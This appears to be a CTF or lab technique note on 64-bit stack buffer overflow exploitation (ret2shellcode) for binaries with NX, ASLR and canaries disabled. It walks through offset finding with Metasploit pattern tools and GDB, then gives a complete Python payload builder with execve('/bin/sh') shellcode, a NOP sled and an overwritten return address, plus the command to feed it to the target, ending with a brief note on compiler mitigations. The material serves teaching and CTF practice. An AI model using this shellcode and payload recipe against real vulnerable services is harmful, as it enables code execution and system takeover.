# Buffer Overflow (ret2shellcode)

Used on: **Binex**

A classic 64-bit stack buffer overflow where an attacker overwrites the saved instruction pointer (RIP) to redirect execution flow back into an attacker-controlled buffer containing shellcode.

## When to Use

- A vulnerable binary reads user input into a fixed-size stack buffer without bounds checking (e.g., `read(0, buf, 1000)` into a 600-byte buffer).
- Exploit mitigations like NX (No-eXecute stack), ASLR, and Stack Canaries are disabled.
- `checksec` reports `No canary found`, `NX disabled`, and `No PIE`.

## Prerequisites

- Shell access to the target or access to the vulnerable service.
- The vulnerable binary to analyze locally.
- GDB with PEDA, GEF, or pwndbg installed.

## How It Works

1. **Find Offset**: Generate a cyclic pattern, crash the binary, and locate the exact offset to the saved Base Pointer (RBP) and Instruction Pointer (RIP).
2. **Control Execution**: Overwrite the saved RIP with the memory address of the injected shellcode.
3. **Execute Payload**: When the vulnerable function returns (`ret`), the CPU jumps to the shellcode instead of the original caller.

## Steps

### 1. Calculate the Offset

Generate a pattern and crash the binary in GDB:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
gdb ./binary
(gdb) run
# Paste pattern
```

Read the crashed RBP/RIP value and find the offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q 0x<crashed_value>
```
*Note: Offset to RIP is usually Offset_to_RBP + 8 on 64-bit systems.*

### 2. Find the Buffer Address

Set a breakpoint at the vulnerable function's `ret` instruction to inspect the live stack pointer (`RSP`):
```bash
(gdb) disassemble main
(gdb) break *<ret_address>
(gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*OFFSET + b'B'*8 + b'C'*8)")
(gdb) x/4xg $rsp
```

### 3. Build the Exploit

Construct a payload consisting of a NOP sled (to improve reliability), the shellcode, padding up to the offset, and the target return address pointing into the NOP sled.

```python
import struct

# x86-64 execve("/bin//sh")
shellcode = (
    b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb"
    b"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53"
    b"\x54\x5f\xb0\x3b\x0f\x05"
)

nop_sled = b"\x90" * 200
offset = 608
junk = b"A" * (offset - len(nop_sled) - len(shellcode))
rbp_pad = b"B" * 8
ret_addr = struct.pack("<Q", 0x7fffffffe260 + 100) # Stack address + offset into NOP sled

payload = nop_sled + shellcode + junk + rbp_pad + ret_addr

with open("payload.bin", "wb") as f:
    f.write(payload)
```

### 4. Execute

```bash
(cat payload.bin; cat) | ./binary
```

## Defensive Note

Compile applications with modern exploit mitigations enabled: Stack Canaries (`-fstack-protector`), NX/DEP (`-z noexecstack`), ASLR/PIE (`-fPIE -pie`), and use safe bounded functions (like `fgets` or `snprintf` instead of `gets` or unbound `read`).
